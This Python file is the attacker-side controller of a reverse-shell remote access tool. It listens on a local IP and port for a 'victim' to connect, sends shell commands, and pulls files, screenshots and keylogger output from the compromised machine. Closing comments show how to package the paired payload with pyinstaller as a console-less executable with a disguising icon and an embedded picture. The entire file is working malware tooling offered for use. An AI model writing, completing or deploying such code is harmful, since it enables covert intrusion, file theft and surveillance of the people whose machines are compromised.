import base64
import socket
import json
import sys
import traceback


def shell():
    global count
    count=1

    while True:

        # get an Input from the user
        command = input("+ shell#~%s: " % str(ip))
        # sends the user's command to the victim's machine.
        reliable_send(command)

        if command == "exit":
            break
        elif command[:2]=="cd" and len(command)>1:
            continue


        elif command[:8]=="download":
            try:
                 with open(command[9:],"wb") as file:

                     size=size_getter()
                     result=byte_getter(size)
                     file.write(base64.b64decode(result+b'=='))
            except:
                print("Can't open the file")
        elif command[:6]=="upload":
            try:
                with open(command[7:],"rb") as fin:

                    encoded=base64.b64encode(fin.read())
                    size=sys.getsizeof(encoded)
                    size_sender(str(size))
                    byte_sender(encoded)

            except:
                failed="Failed to upload"
                reliable_send(base64.b64encode(failed))

        elif command[:10]=="screenshot":
            try:
                with open("screenshot"+str(count)+".png","wb")as screen:
                    size=size_getter()
                    image=byte_getter(size)
                    image_decoded=base64.b64decode(image)
                    screen.write(image_decoded)
                    count +=1
            except:
                print("Couldn't write the image")
        elif command[:12]=="keylog_start":
            print("[+] Key Logger Started!")
            continue
        else:

            # gets the result of the command from the victim machine
            result = reliable_recieve()


            print(result)



def size_getter():
    size= target.recv(1000000).decode()
    return int(size)


def byte_sender(data):
    target.send(data)

def size_sender(size):
    target.send(size.encode())


def server_connection():
    global s,ip,target
    # This line creats a socket, first parameter is declaring it is IPV4, and the second parameter says
    # it's over tcp.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # This line allows the process of connecting to the victim
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # binds the program with the certain IP Address and port.
    s.bind(("192.168.0.28", 9100))
    # This line listens for 5 connections.
    s.listen(5)
    print("Listening for incoming connections.")
    # this sets the variables to the victim's info.
    target, ip = s.accept()
    print("The Victim is connected!")


def reliable_send(data):
    json_data=json.dumps(data)
    target.send(json_data.encode())


def reliable_recieve():
    json_dat=""
    while True:
        try:
            json_dat=json_dat+target.recv(1000024 ).decode()
            return json.loads(json_dat)

        except ValueError:
            continue


def byte_getter(size):
    dat=b''
    while True:
        try:
            dat=dat+target.recv(size)
            return dat
        except :
            continue
            print("Can't Download")

server_connection()
shell()
s.close()

#To make the python file an executable use "pyinstaller reverse_shell.py --onefile --noconsole"

# pyinstaller --add-data "picture Path" --onefile --noconsole --icon <Icon Path> reverseShell.py
